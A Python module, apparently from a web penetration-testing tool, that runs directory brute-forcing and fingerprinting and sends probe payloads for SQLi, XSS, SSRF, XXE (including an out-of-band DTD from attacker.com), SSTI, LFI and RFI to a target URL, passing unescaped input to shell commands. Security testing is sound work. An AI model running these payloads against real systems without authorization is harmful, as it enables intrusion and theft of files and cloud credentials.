#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════════════
        WEB EXPLORATION MODULE - BlackSentinel Strike
═══════════════════════════════════════════════════════════════
"""

import subprocess
import re
import json
import glob as _glob
from datetime import datetime
from urllib.parse import urlparse, urljoin
from pathlib import Path


def _find_wordlist():
    """Auto-detect best available wordlist."""
    candidates = [
        "/usr/share/wordlists/dirb/common.txt",
        "/usr/share/seclists/Discovery/Web-Content/common.txt",
        "/usr/share/dirb/wordlists/common.txt",
        "/opt/homebrew/Cellar/dirb/*/wordlists/common.txt",
    ]
    for path in candidates:
        expanded = _glob.glob(path)
        if expanded and Path(expanded[0]).is_file():
            return expanded[0]
    return "/usr/share/wordlists/dirb/common.txt"


_DEFAULT_WORDLIST = _find_wordlist()


class WebExplorer:
    """Web application explorer"""
    
    def __init__(self, callback=None):
        self.callback = callback
        self.results = {}
        self.session_cookies = {}
        
    def log(self, message, level="info"):
        """Log message"""
        if self.callback:
            self.callback(message, level)
    
    def directory_bruteforce(self, url, wordlist=None, extensions=["php", "html", "txt"]):
        """Directory brute force"""
        if wordlist is None:
            wordlist = _DEFAULT_WORDLIST
        self.log(f"Exploring directories on {url}", "info")
        
        found_dirs = []
        
        # Use gobuster
        try:
            ext_str = ",".join(extensions) if extensions else ""
            cmd = f"gobuster dir -u {url} -w {wordlist} -t 50 -x {ext_str} -q --no-error"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
            
            for line in result.stdout.split('\n'):
                if '(Status:' in line:
                    parts = line.split()
                    path = parts[0]
                    status_match = re.search(r'\(Status:\s*(\d+)\)', line)
                    status = status_match.group(1) if status_match else "???"
                    
                    found_dirs.append({
                        "path": path,
                        "status": status,
                        "url": urljoin(url, path)
                    })
                    self.log(f"Directory: {path} [{status}]", "success")
                    
        except Exception as e:
            self.log(f"Gobuster error: {str(e)}", "error")
        
        # Fallback to dirb if gobuster fails
        if not found_dirs:
            try:
                cmd = f"dirb {url} {wordlist}"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
                
                for line in result.stdout.split('\n'):
                    if '+ ' in line:
                        path = line.split('+ ')[1].strip()
                        found_dirs.append({
                            "path": path,
                            "status": "200",
                            "url": urljoin(url, path)
                        })
            except Exception:
                pass
        
        self.results["directories"] = found_dirs
        self.log(f"Directories found: {len(found_dirs)}", "success")
        
        return found_dirs
    
    def file_discovery(self, url, wordlist=None):
        """File discovery"""
        if wordlist is None:
            wordlist = _DEFAULT_WORDLIST
        self.log(f"Searching for files on {url}", "info")
        
        found_files = []
        
        try:
            cmd = f"gobuster dir -u {url} -w {wordlist} -t 50 -q --no-error"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
            
            for line in result.stdout.split('\n'):
                if '(Status:' in line and '.' in line:
                    parts = line.split()
                    path = parts[0]
                    status_match = re.search(r'\(Status:\s*(\d+)\)', line)
                    status = status_match.group(1) if status_match else "???"
                    
                    found_files.append({
                        "file": path,
                        "status": status,
                        "url": urljoin(url, path)
                    })
                    
        except Exception as e:
            self.log(f"Error: {str(e)}", "error")
        
        self.results["files"] = found_files
        self.log(f"Files found: {len(found_files)}", "success")
        
        return found_files
    
    def technology_fingerprint(self, url):
        """Technology fingerprint"""
        self.log(f"Identifying technologies of {url}", "info")
        
        fingerprint = {
            "cms": None,
            "framework": None,
            "language": None,
            "server": None,
            "os": None,
            "security_headers": {},
            "cookies": [],
            "forms": [],
            "links": []
        }
        
        # Get headers
        try:
            cmd = f"curl -sI {url}"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            
            for line in result.stdout.split('\n'):
                line = line.strip()
                if ':' in line:
                    key, value = line.split(':', 1)
                    key = key.strip().lower()
                    value = value.strip()
                    
                    if key == 'server':
                        fingerprint["server"] = value
                    elif key == 'x-powered-by':
                        fingerprint["language"] = value
                    elif key == 'x-frame-options':
                        fingerprint["security_headers"]["x-frame-options"] = value
                    elif key == 'x-content-type-options':
                        fingerprint["security_headers"]["x-content-type-options"] = value
                    elif key == 'x-xss-protection':
                        fingerprint["security_headers"]["x-xss-protection"] = value
                    elif key == 'strict-transport-security':
                        fingerprint["security_headers"]["hsts"] = value
                    elif key == 'set-cookie':
                        fingerprint["cookies"].append(value)
                        
        except Exception:
            pass
        
        # Get content
        try:
            cmd = f"curl -s {url}"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
            content = result.stdout.lower()
            
            # Detect CMS
            if 'wp-content' in content or 'wordpress' in content:
                fingerprint["cms"] = "WordPress"
            elif 'drupal' in content:
                fingerprint["cms"] = "Drupal"
            elif 'joomla' in content:
                fingerprint["cms"] = "Joomla"
            elif 'shopify' in content:
                fingerprint["cms"] = "Shopify"
            
            # Detect framework
            if 'laravel' in content or 'csrf-token' in content:
                fingerprint["framework"] = "Laravel"
            elif 'django' in content:
                fingerprint["framework"] = "Django"
            elif 'rails' in content:
                fingerprint["framework"] = "Ruby on Rails"
            elif 'express' in content:
                fingerprint["framework"] = "Express.js"
            
            # Search for forms
            form_pattern = r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>'
            forms = re.findall(form_pattern, result.stdout, re.IGNORECASE)
            fingerprint["forms"] = forms[:10]  # Limit to 10
            
            # Search for internal links
            link_pattern = r'href=["\']([^"\']*)["\']'
            links = re.findall(link_pattern, result.stdout, re.IGNORECASE)
            internal_links = [l for l in links if l.startswith('/') or url in l]
            fingerprint["links"] = list(set(internal_links))[:20]  # Limit to 20
            
        except Exception:
            pass
        
        self.results["fingerprint"] = fingerprint
        self.log("Fingerprint completed", "success")
        
        return fingerprint
    
    def vulnerability_scan(self, url):
        """Web vulnerability scan"""
        self.log(f"Scanning vulnerabilities on {url}", "info")
        
        vulns = []
        
        # Nikto
        try:
            cmd = f"nikto -h {url} -Format txt"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
            
            for line in result.stdout.split('\n'):
                if '+ ' in line and ('OSVDB' in line or 'vulnerability' in line.lower()):
                    vulns.append({
                        "type": "nikto",
                        "description": line.strip(),
                        "severity": "medium"
                    })
        except Exception:
            pass
        
        # Check security headers
        try:
            cmd = f"curl -sI {url}"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            headers = result.stdout.lower()
            
            security_checks = [
                ("x-frame-options", "Clickjacking"),
                ("x-content-type-options", "MIME sniffing"),
                ("x-xss-protection", "XSS"),
                ("strict-transport-security", "HSTS"),
                ("content-security-policy", "CSP")
            ]
            
            for header, vuln_type in security_checks:
                if header not in headers:
                    vulns.append({
                        "type": "missing_header",
                        "description": f"Header {header} not found ({vuln_type})",
                        "severity": "low"
                    })
        except Exception:
            pass
        
        self.results["vulnerabilities"] = vulns
        self.log(f"Vulnerabilities found: {len(vulns)}", "warning")
        
        return vulns
    
    def parameter_discovery(self, url):
        """Parameter discovery"""
        self.log(f"Discovering parameters on {url}", "info")
        
        parameters = []
        
        try:
            cmd = f"curl -s {url}"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
            
            # Search for parameters in URLs
            param_pattern = r'[?&](\w+)='
            params = re.findall(param_pattern, result.stdout)
            parameters.extend(list(set(params)))
            
            # Search for forms and their fields
            form_pattern = r'<form[^>]*>(.*?)</form>'
            forms = re.findall(form_pattern, result.stdout, re.DOTALL | re.IGNORECASE)
            
            for form in forms:
                input_pattern = r'<input[^>]*name=["\']([^"\']*)["\'][^>]*>'
                inputs = re.findall(input_pattern, form, re.IGNORECASE)
                parameters.extend(inputs)
            
            parameters = list(set(parameters))
            
        except Exception:
            pass
        
        self.results["parameters"] = parameters
        self.log(f"Parameters found: {len(parameters)}", "success")
        
        return parameters
    
    def sql_injection_detection(self, url):
        """Test for SQL injection vulnerabilities."""
        self.log(f"Testing SQL injection on {url}", "info")
        results = []

        payloads = [
            ("'", "Syntax error-based"),
            ("1' OR '1'='1", "Tautology-based"),
            ("1' UNION SELECT NULL--", "UNION-based"),
            ("1' AND SLEEP(5)--", "Time-based blind"),
            ("1' AND 1=CONVERT(int,(SELECT @@version))--", "Error-based"),
            ("admin'--", "Comment bypass"),
            ("1' WAITFOR DELAY '0:0:5'--", "MSSQL time-based"),
            ("1; SELECT 1--", "Stacked queries"),
        ]

        parsed = urlparse(url)
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for payload, description in payloads:
            try:
                test_param_url = f"{test_url}?id={payload}"
                cmd = f"curl -s -o /dev/null -w '%{{http_code}}' --max-time 10 '{test_param_url}'"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
                status = result.stdout.strip().strip("'")

                if status in ("500", "403", "429"):
                    results.append({
                        "payload": payload,
                        "type": description,
                        "status": status,
                        "evidence": f"HTTP {status} response",
                        "severity": "high"
                    })
                    self.log(f"Possible SQLi: {description} [{status}]", "warning")

            except subprocess.TimeoutExpired:
                results.append({
                    "payload": payload,
                    "type": description,
                    "status": "timeout",
                    "evidence": "Response timeout may indicate time-based injection",
                    "severity": "high"
                })
                self.log(f"Time-based SQLi possible: {description}", "warning")
            except Exception as e:
                self.log(f"SQLi test error: {str(e)}", "error")

        self.results["sql_injection"] = results
        self.log(f"SQL injection tests completed: {len(results)} findings", "info")
        return results

    def xss_detection(self, url):
        """Test for Cross-Site Scripting vulnerabilities."""
        self.log(f"Testing XSS on {url}", "info")
        results = []

        payloads = [
            ("<script>alert('XSS')</script>", "Basic script tag"),
            ("<img src=x onerror=alert(1)>", "Image onerror"),
            ("javascript:alert(1)", "JavaScript URI"),
            ("<svg onload=alert(1)>", "SVG onload"),
            ("'><script>alert(1)</script>", "Break out of attribute"),
            ('" onmouseover="alert(1)"', "Attribute injection"),
            ("<body onload=alert(1)>", "Body onload"),
            ("<iframe src=javascript:alert(1)>", "Iframe JavaScript"),
            ("{{7*7}}", "Template literal injection"),
            ("<input onfocus=alert(1) autofocus>", "Input autofocus"),
            ("<marquee onstart=alert(1)>", "Marquee event"),
            ("<details open ontoggle=alert(1)>", "Details toggle"),
        ]

        parsed = urlparse(url)
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for payload, description in payloads:
            try:
                test_param_url = f"{test_url}?q={payload}"
                cmd = f"curl -s --max-time 10 '{test_param_url}'"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
                body = result.stdout

                if payload in body:
                    results.append({
                        "payload": payload,
                        "type": description,
                        "evidence": "Payload reflected in response without encoding",
                        "severity": "high"
                    })
                    self.log(f"XSS found: {description}", "warning")

            except Exception as e:
                self.log(f"XSS test error: {str(e)}", "error")

        self.results["xss"] = results
        self.log(f"XSS tests completed: {len(results)} findings", "info")
        return results

    def ssrf_detection(self, url):
        """Test for Server-Side Request Forgery."""
        self.log(f"Testing SSRF on {url}", "info")
        results = []

        internal_urls = [
            ("http://127.0.0.1", "Localhost IPv4"),
            ("http://localhost", "Localhost hostname"),
            ("http://[::1]", "Localhost IPv6"),
            ("http://169.254.169.254/latest/meta-data/", "AWS metadata"),
            ("http://metadata.google.internal/", "GCP metadata"),
            ("http://169.254.169.254/metadata/instance", "Azure metadata"),
            ("http://127.0.0.1:6379", "Redis default port"),
            ("http://127.0.0.1:3306", "MySQL default port"),
        ]

        parsed = urlparse(url)
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for internal_url, description in internal_urls:
            try:
                test_param_url = f"{test_url}?url={internal_url}"
                cmd = f"curl -s --max-time 10 '{test_param_url}'"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
                body = result.stdout.lower()

                indicators = ["ami-id", "instance-id", "local-hostname", "metadata",
                              "root:", "daemon:", "redis_version", "mysql"]
                for indicator in indicators:
                    if indicator in body:
                        results.append({
                            "payload": internal_url,
                            "type": description,
                            "evidence": f"Found indicator: {indicator}",
                            "severity": "critical"
                        })
                        self.log(f"SSRF found: {description}", "warning")
                        break

            except Exception as e:
                self.log(f"SSRF test error: {str(e)}", "error")

        self.results["ssrf"] = results
        self.log(f"SSRF tests completed: {len(results)} findings", "info")
        return results

    def xxe_detection(self, url):
        """Test for XML External Entity injection."""
        self.log(f"Testing XXE on {url}", "info")
        results = []

        xxe_payloads = [
            (
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
                "file:///etc/passwd",
                "Local file read"
            ),
            (
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>',
                "file:///etc/hostname",
                "Hostname read"
            ),
            (
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
                "AWS metadata",
                "Cloud metadata"
            ),
            (
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><root>&send;</root>',
                "Out-of-band",
                "OOB XXE via DTD"
            ),
        ]

        parsed = urlparse(url)
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for payload, description, test_type in xxe_payloads:
            try:
                cmd = f"""curl -s --max-time 10 -X POST -H "Content-Type: application/xml" -d '{payload}' '{test_url}'"""
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
                body = result.stdout

                indicators = ["root:", "ami-id", "instance-id", "hostname"]
                for indicator in indicators:
                    if indicator in body.lower():
                        results.append({
                            "payload": payload[:100],
                            "type": test_type,
                            "evidence": f"Found indicator: {indicator}",
                            "severity": "critical"
                        })
                        self.log(f"XXE found: {test_type}", "warning")
                        break

            except Exception as e:
                self.log(f"XXE test error: {str(e)}", "error")

        self.results["xxe"] = results
        self.log(f"XXE tests completed: {len(results)} findings", "info")
        return results

    def ssti_detection(self, url):
        """Test for Server-Side Template Injection."""
        self.log(f"Testing SSTI on {url}", "info")
        results = []

        payloads = [
            ("{{7*7}}", "49", "Jinja2/Twig"),
            ("${7*7}", "49", "FreeMarker/Velocity"),
            ("<%= 7*7 %>", "49", "ERB"),
            ("#{7*7}", "49", "Ruby/String Interpolation"),
            ("{{self.__class__.__mro__[2].__subclasses__()}}", "subclasses", "Python Jinja2 RCE"),
            ("${T(java.lang.Runtime).getRuntime().exec('id')}", "exec", "Java SSTI"),
            ("{{config.items()}}", "config", "Jinja2 config leak"),
            ("{{request.application.__self__._get_data_for_json}}", "internal", "Flask internal"),
        ]

        parsed = urlparse(url)
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for payload, expected, template_type in payloads:
            try:
                test_param_url = f"{test_url}?input={payload}"
                cmd = f"curl -s --max-time 10 '{test_param_url}'"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
                body = result.stdout

                if expected in body and payload not in body:
                    results.append({
                        "payload": payload,
                        "type": template_type,
                        "evidence": f"Template expression evaluated: {expected} found in response",
                        "severity": "critical"
                    })
                    self.log(f"SSTI found: {template_type}", "warning")

            except Exception as e:
                self.log(f"SSTI test error: {str(e)}", "error")

        self.results["ssti"] = results
        self.log(f"SSTI tests completed: {len(results)} findings", "info")
        return results

    def lfi_detection(self, url):
        """Test for Local File Inclusion."""
        self.log(f"Testing LFI on {url}", "info")
        results = []

        payloads = [
            ("../../../../../../etc/passwd", "root:", "Linux passwd"),
            ("../../../../../../etc/shadow", "root:", "Linux shadow"),
            ("../../../../../../etc/hostname", "", "Hostname file"),
            ("../../../../../../proc/self/environ", "PATH=", "Process environment"),
            ("../../../../../../proc/version", "Linux", "Kernel version"),
            ("..\\..\\..\\..\\..\\windows\\win.ini", "[fonts]", "Windows win.ini"),
            ("..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "localhost", "Windows hosts"),
            ("php://filter/convert.base64-encode/resource=/etc/passwd", "cm9vd", "PHP filter (base64)"),
            ("php://filter/convert.base64-encode/resource=index.php", "PD9w", "PHP source leak"),
            ("/etc/passwd%00", "root:", "Null byte injection"),
            ("....//....//....//....//etc/passwd", "root:", "Double encoding"),
        ]

        parsed = urlparse(url)
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for payload, indicator, description in payloads:
            try:
                test_param_url = f"{test_url}?page={payload}"
                cmd = f"curl -s --max-time 10 '{test_param_url}'"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
                body = result.stdout

                if indicator and indicator in body:
                    results.append({
                        "payload": payload,
                        "type": description,
                        "evidence": f"Found expected content: {indicator}",
                        "severity": "high"
                    })
                    self.log(f"LFI found: {description}", "warning")
                elif not indicator and len(body) > 0 and body != result.stdout:
                    pass

            except Exception as e:
                self.log(f"LFI test error: {str(e)}", "error")

        self.results["lfi"] = results
        self.log(f"LFI tests completed: {len(results)} findings", "info")
        return results

    def rfi_detection(self, url):
        """Test for Remote File Inclusion."""
        self.log(f"Testing RFI on {url}", "info")
        results = []

        test_urls = [
            ("http://example.com", "External URL inclusion"),
            ("https://httpbin.org/robots.txt", "HTTPS URL inclusion"),
            ("//attacker.com/shell.txt", "Protocol-relative URL"),
            ("http://127.0.0.1", "Internal URL via RFI"),
        ]

        parsed = urlparse(url)
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for test_remote_url, description in test_urls:
            try:
                test_param_url = f"{test_url}?file={test_remote_url}"
                cmd = f"curl -s --max-time 10 -L '{test_param_url}'"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
                body = result.stdout

                if "User-agent" in body or "Disallow" in body or "httpbin" in body.lower():
                    results.append({
                        "payload": test_remote_url,
                        "type": description,
                        "evidence": "Remote content included in response",
                        "severity": "critical"
                    })
                    self.log(f"RFI found: {description}", "warning")

            except Exception as e:
                self.log(f"RFI test error: {str(e)}", "error")

        self.results["rfi"] = results
        self.log(f"RFI tests completed: {len(results)} findings", "info")
        return results

    def cors_misconfiguration(self, url):
        """Test for CORS misconfiguration."""
        self.log(f"Testing CORS on {url}", "info")
        results = []

        test_origins = [
            ("https://evil.com", "External origin"),
            ("https://attacker.com", "Attacker origin"),
            ("null", "Null origin"),
            (f"{parsed.scheme}://{parsed.netloc}", "Self origin") if (parsed := urlparse(url)) else ("", ""),
        ]

        for origin, description in test_origins:
            if not origin:
                continue
            try:
                cmd = f"curl -sI --max-time 10 -H 'Origin: {origin}' '{url}'"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
                headers = result.stdout

                acao = None
                acac = None
                for line in headers.split('\n'):
                    if 'access-control-allow-origin' in line.lower():
                        acao = line.split(':', 1)[1].strip()
                    if 'access-control-allow-credentials' in line.lower():
                        acac = line.split(':', 1)[1].strip()

                if acao:
                    if acao == '*' or acao == origin:
                        severity = "high" if acao != '*' or acac == 'true' else "medium"
                        evidence = f"ACAO: {acao}"
                        if acac:
                            evidence += f", ACAC: {acac}"
                        results.append({
                            "origin": origin,
                            "type": description,
                            "acao": acao,
                            "acac": acac,
                            "evidence": evidence,
                            "severity": severity
                        })
                        self.log(f"CORS issue: {description} - ACAO: {acao}", "warning")

            except Exception as e:
                self.log(f"CORS test error: {str(e)}", "error")

        self.results["cors"] = results
        self.log(f"CORS tests completed: {len(results)} findings", "info")
        return results

    def security_headers_check(self, url):
        """Check for security headers."""
        self.log(f"Checking security headers on {url}", "info")
        results = []

        expected_headers = {
            "strict-transport-security": {
                "name": "HSTS",
                "severity": "high",
                "recommendation": "Add Strict-Transport-Security header with max-age >= 31536000"
            },
            "content-security-policy": {
                "name": "CSP",
                "severity": "high",
                "recommendation": "Add Content-Security-Policy header"
            },
            "x-frame-options": {
                "name": "X-Frame-Options",
                "severity": "medium",
                "recommendation": "Add X-Frame-Options: DENY or SAMEORIGIN"
            },
            "x-content-type-options": {
                "name": "X-Content-Type-Options",
                "severity": "medium",
                "recommendation": "Add X-Content-Type-Options: nosniff"
            },
            "x-xss-protection": {
                "name": "X-XSS-Protection",
                "severity": "low",
                "recommendation": "Add X-XSS-Protection: 1; mode=block"
            },
            "referrer-policy": {
                "name": "Referrer-Policy",
                "severity": "low",
                "recommendation": "Add Referrer-Policy: strict-origin-when-cross-origin"
            },
            "permissions-policy": {
                "name": "Permissions-Policy",
                "severity": "low",
                "recommendation": "Add Permissions-Policy header to restrict features"
            },
            "x-permitted-cross-domain-policies": {
                "name": "Cross-Domain-Policies",
                "severity": "low",
                "recommendation": "Add X-Permitted-Cross-Domain-Policies: none"
            },
            "cross-origin-opener-policy": {
                "name": "COOP",
                "severity": "medium",
                "recommendation": "Add Cross-Origin-Opener-Policy: same-origin"
            },
            "cross-origin-resource-policy": {
                "name": "CORP",
                "severity": "medium",
                "recommendation": "Add Cross-Origin-Resource-Policy: same-origin"
            },
            "cross-origin-embedder-policy": {
                "name": "COEP",
                "severity": "low",
                "recommendation": "Add Cross-Origin-Embedder-Policy: require-corp"
            },
        }

        try:
            cmd = f"curl -sI --max-time 10 '{url}'"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
            headers = result.stdout.lower()

            found_headers = {}
            for line in headers.split('\n'):
                if ':' in line:
                    key = line.split(':', 1)[0].strip()
                    found_headers[key] = line.split(':', 1)[1].strip()

            for header, info in expected_headers.items():
                if header in found_headers:
                    value = found_headers[header]
                    results.append({
                        "header": info["name"],
                        "status": "present",
                        "value": value,
                        "severity": "info"
                    })
                else:
                    results.append({
                        "header": info["name"],
                        "status": "missing",
                        "severity": info["severity"],
                        "recommendation": info["recommendation"]
                    })
                    self.log(f"Missing header: {info['name']}", "warning")

            hsts_value = found_headers.get("strict-transport-security", "")
            if hsts_value:
                max_age_match = re.search(r'max-age=(\d+)', hsts_value)
                if max_age_match and int(max_age_match.group(1)) < 31536000:
                    results.append({
                        "header": "HSTS max-age",
                        "status": "weak",
                        "value": hsts_value,
                        "severity": "medium",
                        "recommendation": "Increase max-age to at least 31536000"
                    })

            csp_value = found_headers.get("content-security-policy", "")
            if csp_value:
                if "unsafe-inline" in csp_value:
                    results.append({
                        "header": "CSP unsafe-inline",
                        "status": "weak",
                        "value": csp_value,
                        "severity": "medium",
                        "recommendation": "Avoid unsafe-inline in CSP"
                    })
                if "unsafe-eval" in csp_value:
                    results.append({
                        "header": "CSP unsafe-eval",
                        "status": "weak",
                        "value": csp_value,
                        "severity": "high",
                        "recommendation": "Avoid unsafe-eval in CSP"
                    })
                if "*" in csp_value and "default-src" in csp_value:
                    results.append({
                        "header": "CSP wildcard",
                        "status": "weak",
                        "value": csp_value,
                        "severity": "medium",
                        "recommendation": "Avoid wildcard (*) in CSP directives"
                    })

        except Exception as e:
            self.log(f"Security header check error: {str(e)}", "error")

        self.results["security_headers"] = results
        self.log(f"Security headers check completed: {len(results)} findings", "info")
        return results

    def cookie_analysis(self, url):
        """Analyze cookie security flags."""
        self.log(f"Analyzing cookies on {url}", "info")
        results = []

        try:
            cmd = f"curl -sI --max-time 10 '{url}'"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)

            set_cookie_headers = []
            for line in result.stdout.split('\n'):
                if line.lower().startswith('set-cookie:'):
                    set_cookie_headers.append(line.split(':', 1)[1].strip())

            for cookie_header in set_cookie_headers:
                cookie_name = cookie_header.split('=')[0].strip() if '=' in cookie_header else "unknown"
                cookie_lower = cookie_header.lower()

                issues = []

                if 'httponly' not in cookie_lower:
                    issues.append({
                        "flag": "HttpOnly",
                        "status": "missing",
                        "severity": "medium",
                        "recommendation": "Add HttpOnly flag to prevent XSS cookie theft"
                    })

                if 'secure' not in cookie_lower:
                    issues.append({
                        "flag": "Secure",
                        "status": "missing",
                        "severity": "medium",
                        "recommendation": "Add Secure flag to ensure HTTPS-only transmission"
                    })

                samesite_match = re.search(r'samesite=(\w+)', cookie_lower)
                if samesite_match:
                    samesite_value = samesite_match.group(1)
                    if samesite_value == 'none':
                        issues.append({
                            "flag": "SameSite",
                            "status": "none",
                            "severity": "low",
                            "recommendation": "SameSite=None requires Secure flag"
                        })
                    elif samesite_value == 'lax':
                        pass
                    elif samesite_value == 'strict':
                        pass
                else:
                    issues.append({
                        "flag": "SameSite",
                        "status": "missing",
                        "severity": "low",
                        "recommendation": "Add SameSite=Lax or SameSite=Strict"
                    })

                domain_match = re.search(r'domain=([^\s;]+)', cookie_lower)
                if domain_match:
                    domain = domain_match.group(1)
                    if domain.startswith('.'):
                        issues.append({
                            "flag": "Domain",
                            "status": "broad",
                            "severity": "low",
                            "recommendation": f"Cookie domain {domain} is overly broad"
                        })

                path_match = re.search(r'path=([^\s;]+)', cookie_lower)
                if path_match and path_match.group(1) == '/':
                    pass

                max_age_match = re.search(r'max-age=(\d+)', cookie_lower)
                expires_match = re.search(r'expires=([^\s;]+)', cookie_lower)
                if max_age_match:
                    max_age = int(max_age_match.group(1))
                    if max_age > 31536000:
                        issues.append({
                            "flag": "Max-Age",
                            "status": "too_long",
                            "severity": "low",
                            "recommendation": "Cookie lifetime exceeds 1 year"
                        })

                results.append({
                    "cookie": cookie_name,
                    "raw": cookie_header,
                    "issues": issues,
                    "severity": "high" if any(i["severity"] == "high" for i in issues) else
                              "medium" if any(i["severity"] == "medium" for i in issues) else "low"
                })

                for issue in issues:
                    self.log(f"Cookie {cookie_name}: {issue['flag']} - {issue['status']}", "warning")

            if not set_cookie_headers:
                self.log("No Set-Cookie headers found", "info")

        except Exception as e:
            self.log(f"Cookie analysis error: {str(e)}", "error")

        self.results["cookies"] = results
        self.log(f"Cookie analysis completed: {len(results)} cookies analyzed", "info")
        return results

    def api_endpoint_discovery(self, url):
        """Discover API endpoints."""
        self.log(f"Discovering API endpoints on {url}", "info")
        results = []

        common_api_paths = [
            "/api", "/api/v1", "/api/v2", "/api/v3",
            "/rest", "/rest/v1", "/graphql", "/graphql.php",
            "/swagger", "/swagger.json", "/swagger-ui", "/api-docs",
            "/openapi.json", "/openapi.yaml",
            "/api/swagger", "/api/docs",
            "/wp-json", "/wp-json/wp/v2",
            "/xmlrpc.php", "/feed", "/sitemap.xml",
            "/robots.txt", "/.env", "/config.json",
            "/debug", "/debug/vars", "/debug/pprof",
            "/actuator", "/actuator/health", "/actuator/env",
            "/metrics", "/prometheus",
            "/health", "/healthcheck", "/health_check",
            "/version", "/info", "/status",
        ]

        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        for path in common_api_paths:
            try:
                test_url = f"{base_url}{path}"
                cmd = f"curl -sI --max-time 5 -o /dev/null -w '%{{http_code}}' '{test_url}'"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                status = result.stdout.strip().strip("'")

                if status in ("200", "201", "301", "302", "401", "403"):
                    results.append({
                        "path": path,
                        "url": test_url,
                        "status": status,
                        "type": "api_endpoint"
                    })
                    self.log(f"API endpoint found: {path} [{status}]", "success")

            except Exception as e:
                self.log(f"API discovery error for {path}: {str(e)}", "error")

        api_methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"]
        for method in api_methods:
            try:
                cmd = f"curl -sI --max-time 5 -X {method} -o /dev/null -w '%{{http_code}}' '{url}'"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                status = result.stdout.strip().strip("'")

                if status not in ("405", "404", "000"):
                    results.append({
                        "method": method,
                        "url": url,
                        "status": status,
                        "type": "supported_method"
                    })

            except Exception:
                pass

        try:
            cmd = f"curl -sI --max-time 5 -X OPTIONS '{url}'"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            allow_header = None
            for line in result.stdout.split('\n'):
                if line.lower().startswith('allow:'):
                    allow_header = line.split(':', 1)[1].strip()
                    break

            if allow_header:
                results.append({
                    "allowed_methods": allow_header,
                    "url": url,
                    "type": "options_response"
                })
                self.log(f"Allowed methods: {allow_header}", "info")

        except Exception:
            pass

        self.results["api_endpoints"] = results
        self.log(f"API discovery completed: {len(results)} endpoints found", "info")
        return results

    def graphql_introspection(self, url):
        """Test GraphQL introspection query."""
        self.log(f"Testing GraphQL introspection on {url}", "info")
        results = []

        introspection_query = """
        query IntrospectionQuery {
            __schema {
                queryType { name }
                mutationType { name }
                subscriptionType { name }
                types {
                    name
                    kind
                    description
                    fields {
                        name
                        description
                        args { name type { name kind ofType { name } } }
                    }
                }
                directives { name description locations args { name type { name } } }
            }
        }
        """

        graphql_paths = ["/graphql", "/graphql.php", "/api/graphql", "/v1/graphql"]

        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        for path in graphql_paths:
            try:
                test_url = f"{base_url}{path}"
                payload = json.dumps({"query": introspection_query})
                cmd = f"""curl -s --max-time 10 -X POST -H "Content-Type: application/json" -d '{payload}' '{test_url}'"""
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
                body = result.stdout

                if "__schema" in body and "types" in body:
                    try:
                        schema_data = json.loads(body)
                        types = schema_data.get("data", {}).get("__schema", {}).get("types", [])
                        query_type = schema_data.get("data", {}).get("__schema", {}).get("queryType", {}).get("name")
                        mutation_type = schema_data.get("data", {}).get("__schema", {}).get("mutationType", {}).get("name")

                        results.append({
                            "endpoint": test_url,
                            "introspection": True,
                            "query_type": query_type,
                            "mutation_type": mutation_type,
                            "types_count": len(types),
                            "severity": "critical"
                        })
                        self.log(f"Introspection enabled at {test_url}: {len(types)} types", "warning")

                        interesting_types = [t for t in types if not t["name"].startswith("__") and t["kind"] == "OBJECT"]
                        for t in interesting_types[:10]:
                            fields = t.get("fields", [])
                            self.log(f"Type: {t['name']} ({len(fields)} fields)", "info")

                    except json.JSONDecodeError:
                        pass

                elif "introspection" in body.lower() and "disabled" in body.lower():
                    results.append({
                        "endpoint": test_url,
